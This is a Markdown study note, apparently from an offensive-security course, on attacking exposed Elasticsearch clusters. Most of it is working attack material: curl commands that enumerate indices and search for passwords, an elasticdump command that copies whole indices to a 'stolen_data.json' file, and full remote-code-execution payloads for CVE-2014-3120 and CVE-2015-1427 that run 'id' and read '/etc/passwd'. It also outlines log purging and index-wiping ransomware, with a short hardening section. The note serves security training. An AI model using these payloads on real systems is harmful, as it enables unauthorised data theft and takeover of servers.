---
tags: [elasticsearch, open-access, rest-api, data-exfiltration, groovy-rce]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.18 Elasticsearch"
---

# 18 - Elasticsearch: Open Access, Data Exfiltration & Scripting RCE

## 1. Executive Summary

Elasticsearch is a highly scalable, distributed search and analytics engine based on Apache Lucene. It is the core of the ELK stack (Elasticsearch, Logstash, Kibana) and is heavily utilized for log aggregation, full-text search, and real-time metrics monitoring. By default, the Elasticsearch REST API listens on **TCP Port 9200**.

Historically, Elasticsearch deployments did not include native authentication or authorization features out-of-the-box (requiring the paid X-Pack plugin, though basic security is now free in newer versions). Consequently, thousands of clusters are exposed to the internet with entirely open REST APIs. This allows attackers to map the cluster, dump colossal indices of sensitive logs, and—in vulnerable versions—execute arbitrary system commands by abusing the built-in scripting engines (MVEL, Groovy, or Painless).

## 2. Protocol Overview & Architecture

Elasticsearch interacts almost exclusively over a JSON-based RESTful API. There is no custom binary protocol for client interaction; everything is standard HTTP `GET`, `POST`, `PUT`, and `DELETE` requests.

### Core Architecture Components
- **Nodes & Clusters:** A single instance is a Node. Multiple nodes form a Cluster.
- **Indices:** Analogous to databases. Logs or documents are stored within indices.
- **Shards & Replicas:** Indices are split into shards to distribute data across nodes.
- **Scripting Engines:** Elasticsearch supports inline scripting to execute complex evaluations directly on the data. Over its history, it has supported MVEL, Groovy, and currently, Painless.

## 3. Enumeration & Footprinting

Because Elasticsearch operates over HTTP, standard tools like `curl`, `wget`, or web browsers can be used for enumeration.

### Initial Discovery
A simple GET request to the root path returns cluster metadata, including the precise version running.

```bash
curl -X GET "http://<Target_IP>:9200/"

# Expected Output:
# {
#   "name" : "node-1",
#   "cluster_name" : "elasticsearch",
#   "version" : {
#     "number" : "1.4.2",
#     "lucene_version" : "4.10.2"
#   },
#   "tagline" : "You Know, for Search"
# }
```

### The `_cat` API (Cluster Mapping)
The `_cat` API is designed for human-readable output and is invaluable for attackers mapping the environment.

```bash
# Check cluster health
curl -s -X GET "http://<Target_IP>:9200/_cat/health?v"

# List all nodes
curl -s -X GET "http://<Target_IP>:9200/_cat/nodes?v"

# List all indices (The most critical command to find data)
curl -s -X GET "http://<Target_IP>:9200/_cat/indices?v"
```

## 4. Exploitation: Data Dumping & Exfiltration

If an attacker identifies sensitive indices (e.g., `customers`, `production_logs`, `auth_logs`), they can immediately query and dump the data.

### 4.1 Querying Documents
Using the `_search` endpoint, an attacker can extract the JSON documents.

```bash
# Dump the first 100 documents from the 'auth_logs' index
curl -X GET "http://<Target_IP>:9200/auth_logs/_search?size=100&pretty=true"

# Search for specific keywords (e.g., "password") across all indices
curl -X GET "http://<Target_IP>:9200/_search?q=password&size=50&pretty=true"
```

### 4.2 Automated Dumping Tools
For large-scale exfiltration, standard `curl` requests are too slow due to pagination limits. Attackers utilize tools like `elasticdump` to stream gigabytes of data.

```bash
# Dump an entire index to a local JSON file
elasticdump \
  --input=http://<Target_IP>:9200/production_database \
  --output=stolen_data.json \
  --type=data
```

## 5. Advanced Exploitation: Scripting RCE

The most critical vulnerabilities in Elasticsearch's history involve its dynamic scripting capabilities. If inline scripting is enabled on older versions, it leads directly to unauthenticated RCE.

### 5.1 CVE-2014-3120 (MVEL Scripting RCE)
Affects Elasticsearch < 1.2.0. The MVEL scripting engine was enabled by default and allowed Java execution.

**Exploitation:**
```bash
curl -X POST "http://<Target_IP>:9200/_search?pretty" -d '
{
  "size": 1,
  "query": {
    "filtered": {
      "query": { "match_all": {} }
    }
  },
  "script_fields": {
    "rce_payload": {
      "script": "import java.util.*; import java.io.*; String str = \"\"; BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"id\").getInputStream())); StringBuilder sb = new StringBuilder(); while((str=br.readLine())!=null){sb.append(str);} sb.toString();"
    }
  }
}'
```

### 5.2 CVE-2015-1427 (Groovy Scripting RCE)
Affects Elasticsearch 1.3.0 to 1.4.2. After disabling MVEL, Groovy was introduced with a "sandbox." Attackers found a bypass utilizing reflection.

**Exploitation:**
```bash
curl -X POST "http://<Target_IP>:9200/_search?pretty" -d '
{
  "size": 1,
  "script_fields": {
    "lupin": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getText()"
    }
  }
}'
```

### 5.3 Modern RCE via Snapshot/Restore API
In more recent but heavily misconfigured setups, if the cluster is bound to a cloud provider (AWS/GCP), an attacker can abuse the `_snapshot` API to write malicious repositories to S3 buckets, or manipulate paths to overwrite critical host files.

## 6. ASCII Architecture & Attack Diagram

```text
+-----------------------+           +---------------------------------+
|                       | HTTP GET  |       Elasticsearch Node        |
|  Attacker Machine     |==========>|       Port 9200 (REST API)      |
|                       |  /_cat    |       (Unauthenticated)         |
+-----------------------+           +---------------------------------+
           |                                         |
           | 1. Enumeration: /_cat/indices           |
           |<----------------------------------------|
           |    [yellow open auth_logs 5 1 20000]    |
           |                                         |
           | 2. Exfiltration: /auth_logs/_search     |
           |---------------------------------------->|
           |    Extracting PII / Passwords           |
           |<----------------------------------------|
           |                                         |
           | 3. RCE: POST /_search (Groovy Payload)  |
           |---------------------------------------->|
           |                                         |
           |                                         | 4. Sandbox Bypass
           |                                         |    Java Runtime Exec
           |                                         v
           |                                +-------------------------+
           | 5. Output of 'id' command      |    Host Linux System    |
           |<-------------------------------|    uid=1000(elastic)    |
           |                                +-------------------------+
```

## 7. Post-Exploitation & Persistence

- **Log Tampering:** Elasticsearch is often the central logging server for a SIEM. An attacker with full write access can use the `_delete_by_query` API to purge their own tracks from network and application logs.
- **Ransomware:** Similar to MongoDB, automated botnets drop all indices using the `DELETE /*` API and create a new index named `READ_ME_TO_RECOVER_YOUR_DATA`.
- **Lateral Movement:** Extracting SSH keys, AWS access tokens, and database credentials directly from aggregated plain-text application logs.

## 8. Defense, Mitigation, & Hardening

1. **Enable Security Features:** Modern Elasticsearch (7.x+) includes basic security features for free. Enable them in `elasticsearch.yml`:
   ```yaml
   xpack.security.enabled: true
   ```
2. **Network Isolation:** Elasticsearch should never be bound to a public interface. Use a reverse proxy (like Nginx) with basic authentication, or bind exclusively to internal VLANs.
   ```yaml
   network.host: 127.0.0.1
   ```
3. **Disable Dynamic Scripting:** If dynamic scripting is not strictly necessary for the application logic, disable it to kill all MVEL/Groovy/Painless execution vectors.
   ```yaml
   script.allowed_types: none
   ```
4. **Role-Based Access Control (RBAC):** Restrict access so that application components only have read/write access to the specific indices they require, not cluster-wide administrative rights.

## 9. Chaining Opportunities

- **SSRF:** Elasticsearch's RESTful nature makes it the ultimate target for SSRF. A blind SSRF vulnerability on a web application can be used to query internal Elasticsearch instances and exfiltrate data back through the SSRF channel. See **[[07 - Server-Side Request Forgery (SSRF)]]**.
- **Log4Shell:** Elasticsearch heavily relies on Java and Log4j. Older clusters are prime targets for CVE-2021-44228. See **[[13 - Log4Shell (CVE-2021-44228)]]**.

## 10. Related Notes
- [[17 - MongoDB — No Auth, Exposed Port]]
- [[19 - Memcached — Amplification Attack, Data Dumping]]
- [[20 - Docker API — Exposed Daemon, Container Escape]]
- [[21 - Kubernetes API — Unauthenticated Access, RBAC Bypass]]
